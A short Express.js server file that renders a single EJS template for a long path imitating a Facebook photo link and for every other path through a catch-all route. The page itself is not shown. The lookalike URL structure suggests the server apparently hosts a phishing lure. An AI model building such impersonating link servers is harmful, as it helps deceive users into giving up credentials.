var express = require('express');
var app = express();
app.use(express.static('public'));
app.set('view engine','ejs');
const PORT = process.env.PORT || 5000;



app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445',function(req,res){
    res.render('fade7a');
})
app.get('*',function(req,res){
    res.render('fade7a');
})

app.listen(PORT,function(){
    console.log('server started')
})